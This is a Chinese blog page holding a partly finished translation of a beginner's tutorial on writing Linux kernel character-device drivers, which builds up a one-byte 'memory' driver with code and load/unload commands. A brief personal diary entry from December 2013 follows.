                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/linux/2013/12/24/writing-drivers-in-linuxa-brief-tutorial/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/2013/12/24/writing-drivers-in-linuxa-brief-tutorial/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>未完成，因为选的一门课的大作业而翻译，这个简单例子作为一个完整的内核驱动写法展示还行。大概某天会把后面的坑填上。</p>
<p>翻译自<a href="http://www.freesoftwaremagazine.com/articles/drivers_linux" target="_blank" rel="external">http://www.freesoftwaremagazine.com/articles/drivers_linux</a></p>
<blockquote>
<p>你是否渴望有minix 1.1相伴的美好日子？那时男人只是男人，并为自己的设备写驱动程序。</p>
<p>—-Linus Torvalds</p>
</blockquote>
<h2 id="先决条件">先决条件</h2><p>为了开发Linux设备驱动，需要理解以下知识<a href="译者：如果你写过shellcode,这全不是问题哇">^1</a>：</p>
<ul>
<li>C程序。稍微深入理解C编程，比如指针的使用，位操作函数等等。</li>
<li>微处理器编程。需要理解微处理器内部如何工作：内存地址，终端等等。所有这些概念对一个汇编程序员都应该很熟悉。</li>
</ul>
<p>在Linux中有多种设备。为了简洁，这篇教程仅仅涉及以模块加载的<code>char</code>(字符)设备，2.6.x内核将被使用(准确地说是Debian<br>Sarge下的2.6.8内核[^2], 当前的Debian Stable)</p>
<h2 id="用户空间和内核空间">用户空间和内核空间</h2><p>当你写设备驱动时，区分“用户空间”和“内核空间”非常重要：</p>
<ul>
<li>内核空间：Linux(一个内核)以一种简单有效的方式管理机器的硬件，为用户提供一个简单一致的程序接口。同样内核特别是它的设备驱动，组成了一个终端用户/程序员和硬件之间沟通的桥梁。组成内核(例如模块和设备驱动)一部分的任何子程序或函数都被认为是内核空间的一部分。</li>
<li>用户空间：终端用户程序，像UNIX<br><code>shell</code>或其它基于GUI的应用(比如<code>kpresenter</code><a href="请自行google">^3</a>)都是用户空间的一部分。显然，这些应用需要和系统硬件交互。然而，它们不直接交互，而是通过内核支持的函数。<br>一切如图一所示。</li>
</ul>
<p><img src="http://www.freesoftwaremagazine.com/files/nodes/1238/spaces.jpg" alt="图一"></p>
<h2 id="用户空间和内核空间接口函数">用户空间和内核空间接口函数</h2><p>内核在用户空间提供一些子程序和函数，允许最终用户应用程序员和硬件交互。通常，在UNIX或Linux系统中，这个对话通过子程序或函数按顺序读写文件实现。这样做的原因是Unix设备从用户角度来看作为文件可见。</p>
<p>另一方面，在内核空间，Linux也提供了一些函数和子程序执行和硬件直接交互的低级操作，并且允许从内核空间向用户空间传递信息。</p>
<p>通常，对用户空间(允许使用设备或文件)的每个函数，存在一个内核空间(允许从内核想用户空间传递信息，反之亦然)的等价。这在表一中显示了，当前是空表。它将在不同设备驱动概念介绍时填满。</p>
<table>
<thead>
<tr>
<th>事件</th>
<th style="text-align:center">用户空间函数</th>
<th style="text-align:right">内核空间函数</th>
</tr>
</thead>
<tbody>
<tr>
<td>加载模块</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>打开设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>读取设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>写入设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>关闭设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>移除模块</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>表一：设备驱动事件和它们对应在内核和用户空间的接口函数</p>
<h2 id="内核空间和硬件设备之间的接口函数">内核空间和硬件设备之间的接口函数</h2><p>在内核空间中也有控制设备或者在内核和硬件之间交换信息的函数。表二展示了这些概念。这个表也在相关概念引入时填满。</p>
<table>
<thead>
<tr>
<th>事件</th>
<th style="text-align:right">内核空间函数</th>
</tr>
</thead>
<tbody>
<tr>
<td>读取数据</td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>写入数据</td>
</tr>
</tbody>
</table>
<p>表二：设备驱动事件和它们在内核空间与硬件之间交互的函数</p>
<h2 id="第一个驱动：在用户空间加载和卸载驱动">第一个驱动：在用户空间加载和卸载驱动</h2><p>我将向你展示如何开发第一个设备驱动，这个驱动将作为一个模块引入。</p>
<p>我们在<code>nothing.c</code>文件中写入以下程序。</p>
<pre><code><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span>

MODULE_LICENSE(<span class="string">"Dual BSD/GPL"</span>)<span class="comment">;</span>
</code></pre><p>自从kernel2.6.x版本以来，编译模块变得有点复杂。首先，你必须有一个完整的编译内核源码树。如果你有个Debian<br>Sarge系统<a href="如果你有一个gentoo系统，请看附录B">^4</a>，你可以参照附录B(在文末)，本文中我假设你们使用3.12.5版内核。</p>
<p>接着，你需要生成一个makefile文件，这个makefile文件命名为<code>Makefile</code>:</p>
<pre><code><span class="attribute">obj-m :</span>=<span class="string"> nothing.o</span>
</code></pre><p>与早先版本内核不同，现在必须使用你想要加载和使用模块的同一内核编译模块。为了编译它，键入：</p>
<pre><code>$ make -C /usr/src/linux M=<span class="escape">`p</span>wd<span class="escape">` </span>modules
</code></pre><p>这个极简单的模块属于内核空间，一旦加载就是内核空间的一部分。</p>
<p>在用户空间，你可以作为root用户键入以下命令加载模块：</p>
<pre><code><span class="preprocessor"># insmod nothing.ko</span>
</code></pre><p><code>insmod</code>命令允许内核中模块的安装，然而，这个特别的模块没啥用。</p>
<p>可以通过查看所有安装的模块来检查模块有没有正确安装：</p>
<pre><code><span class="preprocessor"># lsmod | grep nothing</span>
</code></pre><p>最后，可以从内核空间中移除内核：</p>
<pre><code><span class="preprocessor"># rmmod nothing</span>
</code></pre><p>通过<code>lsmod</code>命令，你可以确认模块不在内核中了。</p>
<p>所有这些在表三中总结：</p>
<table>
<thead>
<tr>
<th>事件</th>
<th style="text-align:center">用户空间函数</th>
<th style="text-align:right">内核空间函数</th>
</tr>
</thead>
<tbody>
<tr>
<td>加载模块</td>
<td style="text-align:center">insmod</td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>打开设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>读取设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>写入设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>关闭设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>移除模块</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>表三：设备驱动事件和它们对应在内核和用户空间的接口函数</p>
<h2 id="“Hello_world”驱动：加载和移除内核空间的驱动">“Hello world”驱动：加载和移除内核空间的驱动</h2><p>当一个模块载入内核时，通常一些初始任务比如执行如重置设备、准备RAM，准备中断，准备输入/输出端口等等将被执行。</p>
<p>这些任务在内核空间执行，通过必须出现的两个函数(并且显示声明):<code>module_init</code>和<code>module_exit</code>;它们应答用户空间内当加载和移除模块时使用的<code>insmod</code>和<code>rmmod</code>命令。总之，用户命令<code>insmod</code>和<code>rmmod</code>使用内核空间函数<code>module_init</code>和<code>module_exit</code>。</p>
<p>让我们看看经典程序<code>Hello world</code>的实际例子(<code>hello.c</code>)：</p>
<pre><code><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span>
<span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span>
<span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span>

MODULE_LICENSE(<span class="string">"Dual BSD/GPL"</span>);

<span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>{
  printk(<span class="string">"&lt;1&gt; Hello world!\n"</span>);
  <span class="keyword">return</span> <span class="number">0</span>;
}

<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span>{
  printk(<span class="string">"&lt;1&gt; Bye, cruel world\n"</span>);
}

module_init(hello_init);
module_exit(hello_exit);
</code></pre><p>事实上函数<code>hello_init</code>和<code>hello_exit</code>可以是任何想要的名字。然而，为了把它们作为相应的加载卸载函数，它们必须被作为<code>module_init</code>和<code>module_exit</code>的参数。</p>
<p><code>printk</code>函数已经介绍过。非常接近著名的<code>printf</code>除了它在内核中起作用。<code>&lt;1&gt;</code>表示消息的高优先级(低数字)。通过这样，除了在内核系统日志文件中得到消息，也能在系统控制台上收到消息。</p>
<p>这个模块可以用之前同样的命令编译，把它的名字加入Makefile。</p>
<pre><code>obj-m := nothing<span class="class">.o</span> hello.o
</code></pre><p>剩下的文章中，我们将Makefile文件作为读者的联系。完整的包含编译内核模块的Makefile文件在附录A中</p>
<p>当模块加载或卸载时，消息将通过<code>printk</code>命令呈现在系统控制台上。如果这些消息不再出现在控制台中，你可以通过dmesg命令查看，或者通过<code>cat /var/log/syslog</code><a href="我这里没这个文件">^5</a>查看系统日志文件</p>
<p>表四展示了两个新函数。</p>
<table>
<thead>
<tr>
<th>事件</th>
<th style="text-align:center">用户空间函数</th>
<th style="text-align:right">内核空间函数</th>
</tr>
</thead>
<tbody>
<tr>
<td>加载模块</td>
<td style="text-align:center">insmod</td>
<td style="text-align:right">module_init</td>
</tr>
<tr>
<td>打开设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>读取设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>写入设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>关闭设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>移除模块</td>
<td style="text-align:center">rmmod</td>
<td style="text-align:right">module_exit</td>
</tr>
</tbody>
</table>
<p>表四：设备驱动事件和它们对应在内核和用户空间的接口函数</p>
<h2 id="完整的memory驱动：驱动的初始部分">完整的memory驱动：驱动的初始部分</h2><p>我现在展示如何构建一个完整的设备驱动：<code>memory.c</code>。这个设备讲允许字符从设备读取读取或写入设备。这个设备，尽管没啥用，却提供了一个展示的示例，因为这是一个完整的驱动。<br>它也非常容易实现，因为它不和一个真正的硬件设备交互(除了计算机自身)。</p>
<p>为了开发这个驱动，一些新的<code>#include</code>语句将被添加添加，这些语句频繁出现在设备驱动中。</p>
<p>memory initial=</p>
<pre><code><span class="comment">/* 设备驱动必要的includes块 */</span>
<span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span>
<span class="comment">// #include &lt;linux/config.h&gt;  // 2.6.19之后不再有</span>
<span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span>
<span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span> /* printk() */</span>
<span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span> /* kmalloc() */</span>
<span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span> /* everything... */</span>
<span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/errno.h&gt;</span> /* error codes */</span>
<span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/types.h&gt;</span> /* size_t */</span>
<span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span></span>
<span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/fcntl.h&gt;</span> /* O_ACCMODE */</span>
<span class="comment">// #include &lt;asm/system.h&gt; /* cli(), *_flags */ // 不再需要</span>
<span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;asm/uaccess.h&gt;</span> /* copy_from/to_user */</span>

MODULE_LICENSE(<span class="string">"Dual BSD/GPL"</span>);

<span class="comment">/* memory.c 中函数声明 */</span>
<span class="function"><span class="keyword">int</span> <span class="title">memory_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span></span>;
<span class="function"><span class="keyword">int</span> <span class="title">memory_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span></span>;
<span class="keyword">ssize_t</span> memory_read(<span class="keyword">struct</span> file *filp, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *f_pos);
<span class="keyword">ssize_t</span> memory_write(<span class="keyword">struct</span> file *filp, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *f_pos);
<span class="function"><span class="keyword">void</span> <span class="title">memory_exit</span><span class="params">(<span class="keyword">void</span>)</span></span>;
<span class="function"><span class="keyword">int</span> <span class="title">memory_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;

<span class="comment">/* 声明常用文件的结构体 */</span>
<span class="comment">/* 结构体file_operations在头文件
linux/fs.h中定义，用来存储驱动内核模块提供的对
设备进行各种操作的函数的指针。该结构体的每个域都对应着驱动内核模块用来处理某个被请求的
事务的函数的地址。*/</span>
<span class="comment">/* 存取函数 */</span>
<span class="keyword">struct</span> file_operations memory_fops = {
  read: memory_read,
  write: memory_write,
  open: memory_open,
  release: memory_release
};

<span class="comment">/* 声明初始和退出函数 */</span>
module_init(memory_init);
module_exit(memory_exit);

<span class="comment">/* 驱动全局变量声明 */</span>
<span class="comment">/* Major number */</span>
<span class="keyword">int</span> memory_major = <span class="number">60</span>;
<span class="comment">/* 存储数据的缓冲区 */</span>
<span class="keyword">char</span> *memory_buffer;
</code></pre><p>在<code>#include</code>文件之后，先声明之后要定义的函数。操作文件的通用函数一般在<code>file_operations</code>结构体中定义中声明。这些将在下文详细解释。</p>
<p>接着，初始化和退出函数——当加载和卸载模块时使用的函数——像内核声明。</p>
<p>最后，声明驱动的全局变量：一条是驱动的<code>major
number</code>，另一条是指向内存一段区域的指针<code>memory_buffer</code>，这个用来存储驱动数据。</p>
<h2 id="memory驱动：连接设备和它的文件">memory驱动：连接设备和它的文件</h2><p>在UNIX和Linux中，用户空间设备的存取和文件存取完全一样。这些设备文件通常是目录<code>/dev</code>下的子目录。</p>
<p>为了连接正常文件到内核模块需要两个数：<code>major number</code>和<code>minor number</code>。<code>major
number</code>是内核用来链接文件和它的驱动的。<code>minor
number</code>是设备内部使用的，简单起见，本文不讨论它。</p>
<p>为了实现这个，必须创建一个文件(将用来存取设备驱动)，通过在root权限下键入：</p>
<pre><code><span class="preprocessor"># mknod /dev/memory c <span class="number">60</span> <span class="number">0</span></span>
</code></pre><p>其中<code>c</code>代表创建<code>char</code>设备，<code>60</code>是<code>major number</code>，<code>0</code>是<code>minor number</code>。</p>
<p>在驱动内，为了在内核空间中链接它相应的<code>/dev</code>文件，使用<code>register_chrdev</code>函数。传递给它三个参数：<code>major number</code>，一个显示模块名的字符串和一个<code>file_operations</code>结构体。这个结构体将把它定义的文件函数链接到调用。<br>当安装模块时以这种方式调用。</p>
<p><code>memory init module</code>：</p>
<pre><code><span class="type">int</span> memory_init(<span class="type">void</span>) {
    <span class="type">int</span> <span class="literal">result</span>;

    /* <span class="type">Registering</span> device */
    <span class="literal">result</span> = register_chrdev(memory_major, <span class="string">"memory"</span>, &amp;memory_fops);
    <span class="keyword">if</span> (<span class="literal">result</span> &lt; <span class="number">0</span>) {
        printk(
                <span class="string">"&lt;1&gt;memory: cannot obtain major number %d\n"</span>, memory_major);
        <span class="keyword">return</span> <span class="literal">result</span>;
    }

    /* <span class="type">Allocating</span> memory <span class="keyword">for</span> the buffer */
    memory_buffer = kmalloc(<span class="number">1</span>, <span class="type">GFP_KERNEL</span>);
    <span class="keyword">if</span> (!memory_buffer) {
        <span class="literal">result</span> = -<span class="type">ENOMEM</span>;  // 内存耗尽
        goto fail;
    }
    memset(memory_buffer, <span class="number">0</span>, <span class="number">1</span>);

    printk(<span class="string">"&lt;1&gt;Inserting memory module\n"</span>);
    <span class="keyword">return</span> <span class="number">0</span>;

fail:
    memory_exit();
    <span class="keyword">return</span> <span class="literal">result</span>;
}
</code></pre><p>注意<code>kmalloc</code>函数，这个函数用来在内核空间中的设备驱动分配缓冲区内存。它的用法非常类似知名的<code>malloc</code>函数。<br>最后，如果注册<code>major number</code>或者分配内存失败，模块做出相应反应。</p>
<h2 id="memory驱动：移除驱动">memory驱动：移除驱动</h2><p>为了在<code>memory_exit</code>函数中移除模块，函数<code>unregister_chrdev</code>需要出现，来为内核释放<code>major number</code>。</p>
<p><code>&lt;memory exit module&gt;=</code></p>
<pre><code><span class="function"><span class="keyword">void</span> <span class="title">memory_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span>{
    <span class="comment">/* Freeing the major number */</span>
    unregister_chrdev(memory_major, <span class="string">"memory"</span>);

    <span class="comment">/* Freeing buffer memory */</span>
    <span class="keyword">if</span> (memory_buffer) {
        kfree(memory_buffer);
    }
    printk(<span class="string">"&lt;1&gt;Removing memory module\n"</span>);
}
</code></pre><p>为了当移除设备驱动时留下一个干净的内核。在这个函数中同时释放了缓冲区内存。</p>
<h2 id="memory驱动：把设备作为文件打开">memory驱动：把设备作为文件打开</h2><p>内核空间函数，对应于在用户空间打开文件的<code>fopen</code>，是<code>register_chrdev</code>调用的<code>file_operations</code>中<code>open:</code>的一个成员，这个例子中是<code>memory_open</code>函数。它以<code>inode</code>结构体做参数，这个参数参照<code>major number</code>和<code>minor number</code>向内核传递信息;<br>一个带各种能执行到文件上的各种不同操作相关信息的<code>file</code>结构体。任意这些函数都不会在本文中深入讲解。</p>
<p>当文件打开时，通常必须初始化驱动变量或者重置设备，在这个简单的例子中，尽管如此，不会执行这些操作。</p>
<p><code>memory_open</code>函数如下所示：</p>
<p><code>&lt;memory open&gt;=</code></p>
<pre><code><span class="function"><span class="keyword">int</span> <span class="title">memory_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span> </span>{

  <span class="comment">/* Success */</span>
  <span class="keyword">return</span> <span class="number">0</span>;
}
</code></pre><p>这些新的函数现在展示在表五中。</p>
<table>
<thead>
<tr>
<th>事件</th>
<th style="text-align:center">用户空间函数</th>
<th style="text-align:right">内核空间函数</th>
</tr>
</thead>
<tbody>
<tr>
<td>加载模块</td>
<td style="text-align:center">insmod</td>
<td style="text-align:right">module_init</td>
</tr>
<tr>
<td>打开设备</td>
<td style="text-align:center">fopen</td>
<td style="text-align:right">file_operations：open</td>
</tr>
<tr>
<td>读取设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>写入设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>关闭设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>移除模块</td>
<td style="text-align:center">rmmod</td>
<td style="text-align:right">module_exit</td>
</tr>
</tbody>
</table>
<p>表五：设备驱动事件和它们对应在内核和用户空间的接口函数</p>
<h2 id="memory驱动：把设备作为文件关闭">memory驱动：把设备作为文件关闭</h2><p>与用户空间内(<code>fclose</code>)对应的关闭文件函数是<code>register_chrdev</code>调用的<code>file_operations</code>结构体的<code>release:</code>成员。<br>针对本例，是<code>memory_release</code>函数，这个函数有一个<code>inode</code>结构体参数和一个<code>file</code>结构体参数，就像先前一样。</p>
<p>当一个文件被关闭时，通常必须释放使用的内存和任何有关打开设备的变量。但是，再次，为了简单起见，这些操作不执行。</p>
<p><code>memory_release</code>函数如下所示：</p>
<p><code>&lt;memory release&gt;=</code></p>
<pre><code><span class="function"><span class="keyword">int</span> <span class="title">memory_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span> </span>{

    <span class="comment">/* Success */</span>
    <span class="keyword">return</span> <span class="number">0</span>;
}
</code></pre><p>新的函数在表六中展示。</p>
<table>
<thead>
<tr>
<th>事件</th>
<th style="text-align:center">用户空间函数</th>
<th style="text-align:right">内核空间函数</th>
</tr>
</thead>
<tbody>
<tr>
<td>加载模块</td>
<td style="text-align:center">insmod</td>
<td style="text-align:right">module_init</td>
</tr>
<tr>
<td>打开设备</td>
<td style="text-align:center">fopen</td>
<td style="text-align:right">file_operations:open</td>
</tr>
<tr>
<td>读取设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>写入设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>关闭设备</td>
<td style="text-align:center">fclose</td>
<td style="text-align:right">file_operations:release</td>
</tr>
<tr>
<td>移除模块</td>
<td style="text-align:center">rmmod</td>
<td style="text-align:right">module_exit</td>
</tr>
</tbody>
</table>
<p>表六：设备驱动事件和它们对应在内核和用户空间的接口函数</p>
<h2 id="memory驱动：读设备">memory驱动：读设备</h2><p>类似使用用户函数<code>fread</code>读设备，内核空间是<code>register_chrdev</code>函数调用的<code>file_operations</code>结构体的<code>read:</code>成员。这次是函数<code>memory_read</code>。它的参数是file结构、一个用户空间函数(<code>fread</code>)用来读的缓冲区(<code>buf</code>)、一个记着要传输多少字节，和用户空间函数(<code>fread</code>)中计数器有相同值的的计数器(<code>count</code>)、最后，开始读文件的位置(<code>f_pos</code>)。</p>
<p>在这个简单的例子中，<code>memory_read</code>函数通过函数<code>copy_to_user</code>从驱动缓冲区(<code>memory_buffer</code>)传输单个字节给用户空间：</p>
<p><code>&lt;memory read&gt;=</code></p>
<pre><code><span class="keyword">ssize_t</span> memory_read(<span class="keyword">struct</span> file *filp, <span class="keyword">char</span> *buf,
        <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *f_pos) {

    <span class="comment">/* Transfering data to user space */</span>
    copy_to_user(buf,memory_buffer,<span class="number">1</span>);

    <span class="comment">/* Changing reading position as best suits */</span>
    <span class="keyword">if</span> (*f_pos == <span class="number">0</span>) {
        *f_pos+=<span class="number">1</span>;
        <span class="keyword">return</span> <span class="number">1</span>;
    } <span class="keyword">else</span> {
        <span class="keyword">return</span> <span class="number">0</span>;
    }
}
</code></pre><p>表七展示了这些新函数。</p>
<table>
<thead>
<tr>
<th>事件</th>
<th style="text-align:center">用户空间函数</th>
<th style="text-align:right">内核空间函数</th>
</tr>
</thead>
<tbody>
<tr>
<td>加载模块</td>
<td style="text-align:center">insmod</td>
<td style="text-align:right">module_init</td>
</tr>
<tr>
<td>打开设备</td>
<td style="text-align:center">fopen</td>
<td style="text-align:right">file_operations:open</td>
</tr>
<tr>
<td>读取设备</td>
<td style="text-align:center">fread</td>
<td style="text-align:right">file_operations:read</td>
</tr>
<tr>
<td>写入设备</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>关闭设备</td>
<td style="text-align:center">fclose</td>
<td style="text-align:right">file_operations:release</td>
</tr>
<tr>
<td>移除模块</td>
<td style="text-align:center">rmmod</td>
<td style="text-align:right">module_exit</td>
</tr>
</tbody>
</table>
<p>表七：设备驱动事件和它们对应在内核和用户空间的接口函数</p>
<h2 id="memory驱动：写入设备">memory驱动：写入设备</h2><p>类似在用户空间函数<code>fwrite</code>写入设备，内核空间中使用<code>register_chrdev</code>函数调用的<code>file_operations</code>结构体中<code>write:</code>成员。<br>这个例子中是<code>memory_write</code>，拥有以下参数：一个file结构，一个用户空间函数<code>fwrite</code>用来写入的缓冲区(<code>buf</code>)、一个就像用户空间函数(<code>fwrite</code>)中计数器相同的值的计算传输字节数的计数器(<code>count</code>)、最后，是一个从文件何处开始的位置参数<code>f_pos</code>。</p>
<p><code>&lt;memory write&gt;=</code></p>
<pre><code><span class="keyword">ssize_t</span> memory_write( <span class="keyword">struct</span> file *filp, <span class="keyword">char</span> *buf,
        <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *f_pos) {

    <span class="keyword">char</span> *tmp;

    tmp=buf+count-<span class="number">1</span>;
    copy_from_user(memory_buffer,tmp,<span class="number">1</span>);
    <span class="keyword">return</span> <span class="number">1</span>;
}
</code></pre><p>在本例中，函数<code>copy_from_user</code>从用户空间向内核空间传输数据。</p>
<p>表八显示了这个新函数</p>
<table>
<thead>
<tr>
<th>事件</th>
<th style="text-align:center">用户空间函数</th>
<th style="text-align:right">内核空间函数</th>
</tr>
</thead>
<tbody>
<tr>
<td>加载模块</td>
<td style="text-align:center">insmod</td>
<td style="text-align:right">module_init</td>
</tr>
<tr>
<td>打开设备</td>
<td style="text-align:center">fopen</td>
<td style="text-align:right">file_operations:open</td>
</tr>
<tr>
<td>读取设备</td>
<td style="text-align:center">fread</td>
<td style="text-align:right">file_operations:read</td>
</tr>
<tr>
<td>写入设备</td>
<td style="text-align:center">fwrite</td>
<td style="text-align:right">file_operations:write</td>
</tr>
<tr>
<td>关闭设备</td>
<td style="text-align:center">fclose</td>
<td style="text-align:right">file_operations:release</td>
</tr>
<tr>
<td>移除模块</td>
<td style="text-align:center">rmmod</td>
<td style="text-align:right">module_exit</td>
</tr>
</tbody>
</table>
<p>表八：设备驱动事件和它们对应在内核和用户空间的接口函数</p>
<h2 id="完整的memory驱动">完整的memory驱动</h2><p>把先前展示的代码结合起来，就是完整的代码：</p>
<p><code>&lt;memory.c&gt;=</code></p>
<pre><code>&lt;<span class="keyword">memory</span> initial&gt;
&lt;<span class="keyword">memory</span> init module&gt;
&lt;<span class="keyword">memory</span> <span class="keyword">exit</span> module&gt;
&lt;<span class="keyword">memory</span> <span class="keyword">open</span>&gt;
&lt;<span class="keyword">memory</span> release&gt;
&lt;<span class="keyword">memory</span> <span class="keyword">read</span>&gt;
&lt;<span class="keyword">memory</span> write&gt;
</code></pre><p>在设备能使用之前，你必须像上文所述一样编译模块，然后装载：</p>
<pre><code><span class="preprocessor"># insmod memory.ko</span>
</code></pre><p>更改设备权限：</p>
<pre><code><span class="preprocessor"># chmod <span class="number">666</span> /dev/memory</span>
</code></pre><p>如果一切安好，你将有一个<code>/dev/memory</code>的设备，你可以写入字符串并且它将存储最后一个。你可以执行像这样的操作：</p>
<pre><code><span class="variable">$ </span>echo -n abcdef &gt;<span class="regexp">/dev/memory</span>
</code></pre><p>使用<code>cat</code>检查设备中的内容：</p>
<p>$ cat /dev/memory</p>
<p>存储的值不会变化，直到它被覆盖或者模块被移除。</p>
<h2 id="Footnotes">Footnotes</h2><p>[^2]:我是gentoo linux下的3.12.5-ck，现在debian stable已经7 wheezy了</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2013/12/21/" itemprop="url">
                  不忘初心，方得始终
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-12-21T00:00:00+08:00" content="2013-12-21">
              2013-12-21
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2013/12/21/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2013/12/21//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <blockquote>
<p>Hacking is part of life, not the opposite.</p>
</blockquote>
<p>题目来自于华严经，是R语言课老师课件上展示给我们的。</p>
<p>好久没写技术类文章了，一是没空，二是没心情，三是不想折腾，四是想回到生活中去。</p>
<p>胡乱记下，不想忘。</p>
<p>12月4号到6号，铁夹子玩得丧心病狂，晚上搞到一点热情难抑地用夹子做了个铁塔。</p>
<p>12月5号助管，给助管老师拿上千块钱的东西，也算老师的信任吧，周六还打电话帮拿了个快递。。。</p>
<p>8号早上aqi440多，一片大雾，这种天气党支部活动竟然去科技馆了，走马观花的围观了很多有意思的东西。真是科普，而且都是玩的。。。<br>等到中午回到学校都两点了，下午的SUSE 13.1 Release<br>Party也就没去了。不过12月3号论坛上发帖说送DVD的DVD竟然拿到了，回来正好室友不小心把系统搞挂了，干脆给了他一个SUSE装上，虽然后来他还是回归debian了。</p>
<p>等到晚上aqi降到60，帝都这空气质量大转变。</p>
<p>11号，好象是办公室搬家第二天，刚换了个地方没有网，想把以前办公室的网线拉过去。<br>于是和斌哥第一次上了楼顶，广阔的视野美的摄人心魄，简直被迷住了。</p>
<p>12号，又是助管日，第二次去金五星，去一家玩具店换玩偶，拿发票。天气和骄阳都好到不行。<br>下午第一次在游泳馆游泳，阳光穿过窗口，晒在水面上有种梦幻的感觉。</p>
<p>本来说晚上开会没开，项目由于boss要视察都发展到快一天一会了。各种电话会。结果游泳后竟然第一次吃回转火锅。</p>
<p>十三号，几乎是故意错过了一次电话会议。。。不算故意。。。但是错过了。。。</p>
